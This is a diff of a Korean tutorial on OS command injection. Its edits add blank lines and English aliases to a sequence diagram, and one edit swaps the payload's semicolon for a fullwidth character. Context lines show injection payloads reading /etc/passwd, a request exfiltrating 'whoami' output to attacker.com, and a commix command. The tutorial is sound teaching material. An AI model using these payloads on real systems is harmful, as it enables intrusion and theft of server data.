@@ -17,6 +17,7 @@ categories: [web-hacking]
 
 ## 2. 위험도
 
+
 | 항목 | 값 |
 |------|-----|
 | **OWASP Top 10** | A05:2025 - Injection |
@@ -31,6 +32,7 @@ categories: [web-hacking]
 
 쉘에서 여러 명령을 연결하는 메타 문자를 악용한다.
 
+
 | 문자 | 설명 | 예시 |
 |------|------|------|
 | `;` | 명령 구분 (앞 명령 성공 여부 무관) | `127.0.0.1; cat /etc/passwd` |
@@ -44,15 +46,15 @@ categories: [web-hacking]
 **Command Injection 흐름:**
 ```mermaid
 sequenceDiagram
-    participant 공격자
-    participant 웹서버
+    participant Attacker as 공격자
+    participant WebServer as 웹서버
     participant OS
 
-    공격자->>웹서버: 1. IP 입력: 127.0.0.1; cat /etc/passwd
-    웹서버->>OS: 2. system("ping 127.0.0.1; cat /etc/passwd")
+    Attacker->>WebServer: 1. IP 입력: 127.0.0.1； cat /etc/passwd
+    WebServer->>OS: 2. system("ping 127.0.0.1； cat /etc/passwd")
     Note right of OS: 두 명령이 순차 실행됨
-    OS-->>웹서버: 3. ping 결과 + /etc/passwd 내용
-    웹서버-->>공격자: 4. 민감 정보 노출
+    OS-->>WebServer: 3. ping 결과 + /etc/passwd 내용
+    WebServer-->>Attacker: 4. 민감 정보 노출
 ```
 
 ---
@@ -176,6 +178,7 @@ GET /ping?ip=127.0.0.1;ping%20-c1%20$(whoami).attacker.com HTTP/1.1
 
 ### 4.2. 방어 대책
 
+
 | 공격 | 방어 |
 |:---|:---|
 | 기본 Injection | 방어 1, 2, 3 |
@@ -271,6 +274,7 @@ commix --url="http://target/ping?ip=127.0.0.1"
 ---
 
 ## OWASP Top 10 매핑
+
 
 | 관련 항목 | 설명 |
 |----------|------|
